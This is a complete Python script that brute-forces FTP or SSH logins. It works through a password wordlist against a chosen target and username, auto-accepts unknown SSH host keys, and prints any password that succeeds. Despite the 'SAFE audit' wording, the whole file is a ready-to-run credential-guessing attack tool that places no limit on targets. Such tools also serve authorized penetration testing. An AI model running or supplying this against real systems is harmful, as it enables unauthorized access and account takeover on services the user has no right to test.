import argparse
import ftplib
import socket
import sys
import time
from pathlib import Path

import paramiko


# Arguments #######
def parse_arguments():
    """Parse command-line arguments for the audit script."""
    parser = argparse.ArgumentParser()

    # Target host or IP address ###
    parser.add_argument("target")

    # Service to test: FTP or SSH ####
    parser.add_argument("--service", choices=["ftp", "ssh"], required=True)

    # Username to authenticate with ####
    parser.add_argument("--user", required=True)

    ##### Path to password wordlist file
    parser.add_argument("--wordlist", type=Path, required=True)

    #### Optional custom port; defaults depend on service
    parser.add_argument("--port", type=int, default=None)

    return parser.parse_args()


# Wordlist loader####


def load_wordlist(path: Path) -> list[str]:
    """Load passwords from a wordlist file, ignoring blank lines."""
    if not path.exists():
        print("[!] ERROR: Wordlist not found", file=sys.stderr)
        sys.exit(1)

    #### Read the file safely, ignoring decoding errors
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


# FTP attempt


def attempt_ftp(host, port, user, password):
    """Attempt a single FTP login. Return True on success, else False."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        return True
    except Exception:
        return False
    finally:
        ##
        try:
            ftp.quit()
        except Exception:
            pass


# SSH attempt


def attempt_ssh(host, port, user, password):
    """Attempt a single SSH login. Return True on success, else False."""
    client = paramiko.SSHClient()

    ## Automatically trust unknown host keys for this audit context
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=password,
            timeout=5,
            auth_timeout=5,
        )
        return True
    except Exception:
        return False
    finally:
        #### Ensure the SSH client is always closed
        client.close()


# Main loop-
def run(host, port, user, passwords, fn):
    """Try each password in sequence using the supplied login function."""
    total = len(passwords)

    for i, pw in enumerate(passwords, start=1):
        print(f"[*] Attempt {i}/{total}")

        # Small delay between attempts

        time.sleep(0.1)

        # Stop immediately if valid credentials are found
        if fn(host, port, user, pw):
            print(f"[+] SUCCESS: Password found: {pw}")
            return True

    return False


# Main
def main():
    """Program entry point."""
    args = parse_arguments()

    ### Apply standard default ports if no custom port was provided
    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    ### Load candidate passwords from the provided wordlist
    passwords = load_wordlist(args.wordlist)

    ### Select the appropriate authentication function
    fn = attempt_ftp if args.service == "ftp" else attempt_ssh

    ### Print audit configuration summary
    print(f"[*] Starting SAFE audit on {args.target}:{args.port}")
    print(f"[*] Attempts limited to {len(passwords)}")
    print(f"[*] Concurrency: 1\n")

    ## Run the password attempts
    success = run(args.target, args.port, args.user, passwords, fn)

    ## # Report when no password matched
    if not success:
        print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")


if __name__ == "__main__":
    main()
